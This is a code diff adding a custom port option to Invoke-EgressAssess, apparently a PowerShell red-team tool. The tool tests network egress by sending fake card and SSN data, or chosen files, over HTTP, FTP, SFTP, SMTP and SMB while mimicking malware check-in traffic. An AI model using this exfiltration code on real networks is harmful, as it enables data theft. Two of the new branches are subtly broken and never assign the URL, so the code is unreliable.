@@ -57,9 +57,12 @@ function Invoke-EgressAssess
     This switch reduces the time required to generate fake data.
     Note: Fake CC and SSN data will be generated in batches of 500 sequential values.
 
+.Parameter Port
+    The port is if you wish to specify a non-standard port for data transfer(s)
+
 .Example
     Import-Module Egress-Assess.ps1
-    Invoke-EgressAssess -client http -ip 127.0.0.1 -Datatype cc -Size 50 -Loop 20 -Fast -Verbose
+    Invoke-EgressAssess -client http -ip 127.0.0.1 -Datatype cc -Size 50 -Port 8080 -Loop 20 -Fast -Verbose
     Invoke-EgressAssess -client ftp -ip 127.0.0.1 -Username user -Password pass -Datatype ssn -Size 10 -Verbose
     Invoke-EgressAssess -client smb -ip 127.0.0.1 -Datatype "c:\Users\testuser\secrets.xlsx" -Verbose
     Invoke-EgressAssess -client icmp -ip 127.0.0.1 -Datatype ssn -Report -Verbose
@@ -87,6 +90,8 @@ function Invoke-EgressAssess
         [string]$Username,
         [Parameter(Mandatory = $False)]
         [string]$Password,
+        [Parameter(Mandatory = $False)]
+        [int]$Port,
         [Parameter(Mandatory = $False)]
         [int]$Size = 1,
         [Parameter(Mandatory = $False)]
@@ -145,34 +150,37 @@ function Invoke-EgressAssess
                 }
                 else
                 {
-                    if ($client -eq "http")
+                    if(!$Port)
                     {
-                        $port = 80
-                    }
-                    elseif ($client -eq "https")
-                    {
-                        $port = 443
-                    }
-                    elseif ($client -eq "ftp")
-                    {
-                        $port = 21
-                    }
-                    elseif ($client -eq "sftp")
-                    {
-                        $port = 22
-                    }
-                    elseif ($client -eq "smtp")
-                    {
-                        $port = 25
-                    }
-                    elseif ($client -eq "smb")
-                    {
-                        $port = 445
-                    }
-                    else
-                    {
-                        Write-Verbose "[*] Protocol not available."
-                        throw "Error"
+                        if ($client -eq "http")
+                        {
+                            $port = 80
+                        }
+                        elseif ($client -eq "https")
+                        {
+                            $port = 443
+                        }
+                        elseif ($client -eq "ftp")
+                        {
+                            $port = 21
+                        }
+                        elseif ($client -eq "sftp")
+                        {
+                            $port = 22
+                        }
+                        elseif ($client -eq "smtp")
+                        {
+                            $port = 25
+                        }
+                        elseif ($client -eq "smb")
+                        {
+                            $port = 445
+                        }
+                        else
+                        {
+                            Write-Verbose "[*] Protocol not available."
+                            throw "Error"
+                        }
                     }
                     
                     #attempt to test connection to TCP ports
@@ -546,11 +554,26 @@ function Invoke-EgressAssess
                         
                         if ($client -eq "http")
                         {
-                            $Url = "http://" + $IP + "/major/images/view.php"
+                            if (!$Port)
+                            {
+                                $Url = "http://" + $IP + "/major/images/view.php"
+                            }
+                            else
+                            {
+                                $Url = "http://" + $IP + ":" + $Port + "/major/images/view.php"
+                            }
                         }
                         elseif ($client -eq "https")
                         {
-                            $Url = "https://" + $IP + "/major/images/view.php"
+                            if (!$Port)
+                            {
+                                $Url = "https://" + $IP + "/major/images/view.php"
+                            }
+                            else
+                            {
+                                $Url = "https://" + $IP + ":" + $Port + "/major/images/view.php"
+                            }
+                            
                         }
                         $ranHost = Get-Random -InputObject $checkinDomains
                         [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
@@ -575,11 +598,27 @@ function Invoke-EgressAssess
                     # Checkin Request 2
                     if ($client -eq "http")
                     {
-                        $Url = "http://" + $IP + "/major/txt/read.php"
+                        if(!$Port)
+                        {
+                            $Url = "http://" + $IP + "/major/txt/read.php"
+                        }
+                        else
+                        {
+                            $Url = "http://" + $IP + ":" + $Port + "/major/txt/read.php"
+                        }
+                        
                     }
                     elseif ($client -eq "https")
                     {
-                        $Url = "https://" + $IP + "/major/txt/read.php"
+                        if(!$Port)
+                        {
+                            $Url = "https://" + $IP + "/major/txt/read.php"
+                        }
+                        else
+                        {
+                            $Url = "https://" + $IP + ":" + $Port + "/major/txt/read.php"
+                        }
+                        
                     }
                     $ranHost = Get-Random -InputObject $checkinDomains
                     [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
@@ -607,11 +646,27 @@ function Invoke-EgressAssess
                     $ranURI = Get-Random -InputObject $uris
                     if ($client -eq "http")
                     {
-                        $Url = "http://" + $IP + $ranURI
+                        if(!$Port)
+                        {
+                            $Url = "http://" + $IP + $ranURI
+                        }
+                        else
+                        {
+                            $Url = "http://" + $IP + ":" + $Port + $ranURI
+                        }
+                        
                     }
                     elseif ($client -eq "https")
                     {
-                        $Url = "https://" + $IP + $ranURI
+                        if(!$Port)
+                        {
+                            $Url = "https://" + $IP + $ranURI
+                        }
+                        else
+                        {
+                            $Url = "https://" + $IP + ":" + $Port + $ranURI
+                        }
+                        
                     }
                     $ranHost = Get-Random -InputObject $checkinDomains
                     [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
@@ -693,11 +748,27 @@ function Invoke-EgressAssess
                 # Checkin Request
                 if ($client -eq "http")
                 {
-                    $Url = "http://" + $IP + "/home/index.asp?typeid=13"
+                    if (!$Port)
+                    {
+                        $Url = "http://" + $IP + "/home/index.asp?typeid=13"
+                    }
+                    else
+                    {
+                        $Url = "http://" + $IP + ":" + $Port + "/home/index.asp?typeid=13"
+                    }
+                    
                 }
                 elseif ($client -eq "https")
                 {
-                    $Url = "https://" + $IP + "/home/index.asp?typeid=13"
+                    if(!$Port)
+                    {
+                        $Url = "https://" + $IP + "/home/index.asp?typeid=13"
+                    }
+                    else
+                    {
+                        $Url = "https://" + $IP + ":" + $Port + "/home/index.asp?typeid=13"
+                    }
+                    
                 }
                 $ranHost = Get-Random -InputObject $domains
                 [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
@@ -723,11 +794,27 @@ function Invoke-EgressAssess
                     $ranURI = Get-Random -InputObject $uris
                     if ($client -eq "http")
                     {
-                        $Url = "http://" + $IP + $ranURI
+                        if(!$Port)
+                        {
+                            $Url = "http://" + $IP + $ranURI
+                        }
+                        else {
+                            {
+                                $Url = "http://" + $IP + ":" + $Port + $ranURI
+                            }
+                        }
                     }
                     elseif ($client -eq "https")
                     {
-                        $Url = "https://" + $IP + $ranURI
+                        if(!$Port)
+                        {
+                            $Url = "https://" + $IP + $ranURI
+                        }
+                        else
+                        {
+                            $Url = "https://" + $IP + ":" + $Port + $ranURI
+                        }
+                        
                     }
                     $ranHost = Get-Random -InputObject $domains
                     [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
@@ -989,11 +1076,27 @@ function Invoke-EgressAssess
                     $ranURI = Get-Random -InputObject $uris
                     if ($client -eq "http")
                     {
-                        $Url = "http://" + $IP + $ranURI
+                        if(!$Port)
+                        {
+                            $Url = "http://" + $IP + $ranURI
+                        }
+                        else
+                        {
+                            $Url = "http://" + $IP + ":" + $Port + $ranURI
+                        }
+                        
                     }
                     elseif ($client -eq "https")
                     {
-                        $Url = "https://" + $IP + $ranURI
+                        if(!$Port)
+                        {
+                            $Url = "https://" + $IP + $ranURI
+                        }
+                        else
+                        {
+                            $Url = "https://" + $IP + ":" + $Port + $ranURI
+                        }
+                        
                     }
                     $ranHost = Get-Random -InputObject $domains
                     [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
@@ -1100,11 +1203,27 @@ function Invoke-EgressAssess
                     $ranURI = Get-Random -InputObject $uris
                     if ($client -eq "http")
                     {
-                        $Url = "http://" + $IP + $ranURI
+                        if(!$Port)
+                        {
+                            $Url = "http://" + $IP + $ranURI
+                        }
+                        else
+                        {
+                            $Url = "http://" + $IP + ":" + $Port + $ranURI
+                        }
+                        
                     }
                     elseif ($client -eq "https")
                     {
-                        $Url = "https://" + $IP + $ranURI
+                        if(!$Port)
+                        {
+                            $Url = "https://" + $IP + $ranURI
+                        }
+                        else
+                        {
+                            $Url = "https://" + $IP + ":" + $Port + $ranURI
+                        }
+                        
                     }
                     $ranHost = Get-Random -InputObject $domains
                     [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
@@ -1233,11 +1352,27 @@ function Invoke-EgressAssess
                 }
                 if ($client -eq "http")
                 {
-                    $Url = "http://" + $IP + "/post_data.php"
+                    if (!$Port)
+                    {
+                        $Url = "http://" + $IP + "/post_data.php"
+                    }
+                    else
+                    {
+                        $Url = "http://" + $IP + ":" + $Port + "/post_data.php"
+                    }
+                    
                 }
                 elseif ($client -eq "https")
                 {
-                    $Url = "https://" + $IP + "/post_data.php"
+                    if (!$Port)
+                    {
+                        $Url = "https://" + $IP + "/post_data.php"
+                    }
+                    else
+                    {
+                        "https://" + $IP + ":" + $Port + "/post_data.php"
+                    }
+                    
                 }
                 
             }
@@ -1353,7 +1488,15 @@ function Invoke-EgressAssess
             }
             if ($filetransfer -eq $True)
             {
-                $Destination = "ftp://" + $IP + "/" + $Path
+                if (!$Port)
+                {
+                    $Destination = "ftp://" + $IP + "/" + $Path
+                }
+                else
+                {
+                    $Destination = "ftp://" + $IP + ":" + $Port + "/" + $Path
+                }
+                
                 $SourceFilePath = Get-ChildItem $Datatype | % { $_.FullName }
                 $webclient = New-Object System.Net.WebClient
                 $webclient.Credentials = New-Object System.Net.NetworkCredential($username, $password)
@@ -1376,7 +1519,16 @@ function Invoke-EgressAssess
                     {
                         $Date = Get-Date -Format Mdyyyy_hhmmss
                         $Path = "ftpdata" + $Date + ".txt"
-                        $Destination = "ftp://" + $Username + ":" + $Password + "@" + $IP + "/" + $Path
+
+                        if (!$Port)
+                        {
+                            $Destination = "ftp://" + $Username + ":" + $Password + "@" + $IP + "/" + $Path
+                        }
+                        else
+                        {
+                            $Destination = "ftp://" + $Username + ":" + $Password + "@" + $IP + ":" + $Port + "/" + $Path
+                        }
+                        
                         
                         $ftpClient = New-Object System.Net.WebClient
                         $uri = New-Object System.Uri($Destination)
@@ -1482,10 +1634,15 @@ function Invoke-EgressAssess
                     Break
                 }
             }
-            # Connect to Egress-Assess Server       
+            # Connect to Egress-Assess Server
+            if(!$Port)
+            {
+                $Port = 22
+            }
+
             try
             {
-                $Con = New-Object Renci.SshNet.PasswordConnectionInfo($IP, $Username, $Password)
+                $Con = New-Object Renci.SshNet.PasswordConnectionInfo($IP, $Port, $Username, $Password)
                 $sftpClient = New-Object Renci.SshNet.SftpClient($Con)
                 $sftpClient.Connect()
             }
@@ -1582,13 +1739,18 @@ function Invoke-EgressAssess
             {
                 Try
                 {
+                    if (!$Port)
+                    {
+                        $Port = 25
+                    }
+
                     if ($filetransfer -eq $true)
                     {
-                        Send-MailMessage -From tester@egress-assess.com -To server@egress-asses.com -Subject "Egress-Assess Exfil Data" -Body "EgressAssess With Attachment" -Attachments "$SourceFilePath" -SmtpServer $IP
+                        Send-MailMessage -From tester@egress-assess.com -To server@egress-asses.com -Subject "Egress-Assess Exfil Data" -Body "EgressAssess With Attachment" -Attachments "$SourceFilePath" -SmtpServer $IP -Port $Port
                     }
                     else
                     {
-                        Send-MailMessage -From tester@egress-assess.com -To server@egress-asses.com -Subject "Egress-Assess Exfil Data" -Body "$SMTPData" -SmtpServer $IP
+                        Send-MailMessage -From tester@egress-assess.com -To server@egress-asses.com -Subject "Egress-Assess Exfil Data" -Body "$SMTPData" -SmtpServer $IP -Port $Port
                     }
                 }
                 catch
